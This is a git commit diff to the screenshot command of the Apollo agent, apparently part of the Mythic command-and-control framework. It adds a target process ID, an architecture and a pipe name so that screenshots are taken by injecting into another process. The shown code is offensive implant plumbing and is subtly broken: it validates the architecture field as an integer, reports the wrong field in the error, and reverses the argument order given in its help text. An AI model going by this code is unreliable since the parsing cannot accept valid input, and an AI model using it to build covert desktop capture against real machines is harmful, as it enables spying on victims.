e5878009e8a2bb77e3c1a1fc63b1891a27d11b06
Brandon <reznok@gmail.com>
2020-11-19 02:08:06 -0800

    Updated Agent. Testing Screenshot DLL.

--- Payload_Type/Apollo/mythic/agent_functions/screenshot.py
+++ Payload_Type/Apollo/mythic/agent_functions/screenshot.py
@@ -1,4 +1,5 @@
 from CommandBase import *
+from uuid import uuid4
 import json
 
 
@@ -6,18 +7,35 @@ class ScreenshotArguments(TaskArguments):
 
     def __init__(self, command_line):
         super().__init__(command_line)
-        self.args = {}
+        self.args = {
+            "pid": CommandParameter(name="PID", type=ParameterType.Number, description="Process ID to inject into."),
+            "arch": CommandParameter(name="Architecture", type=ParameterType.String, choices=["x86", "x64"], description="Architecture of the remote process."),}
 
     async def parse_arguments(self):
-        if len(self.command_line.strip()) > 0:
-            raise Exception("screenshot takes no command line arguments.")
+        if self.command_line[0] == "{":
+            self.load_args_from_json_string(self.command_line)
+        else:
+            parts = self.command_line.strip().split(" ", maxsplit=2)
+            valid_arch = ["x86", "x64"]
+            if len(parts) != 2:
+                raise Exception("Invalid command line arguments passed.\n\tUsage: {}".format(ScreenshotCommand.help_cmd))
+            try:
+                int(parts[1])
+            except:
+                raise Exception(f"Invalid PID passed to screenshot: {parts[0]}")
+            self.add_arg("pid", int(parts[0]), ParameterType.Number)
+            if parts[1] not in valid_arch:
+                arches = ", ".join(valid_arch)
+                raise Exception(f"Invalid architecture passed: {parts[1]}. Must be one of {arches}")
+            self.add_arg("arch", parts[1])
+        self.add_arg("pipe_name", str(uuid4()))
         pass
 
 
 class ScreenshotCommand(CommandBase):
     cmd = "screenshot"
     needs_admin = False
-    help_cmd = "screenshot"
+    help_cmd = "screenshot <x86/x64> <pid>"
     description = "Take a screenshot of the current desktop."
     version = 1
     is_exit = False
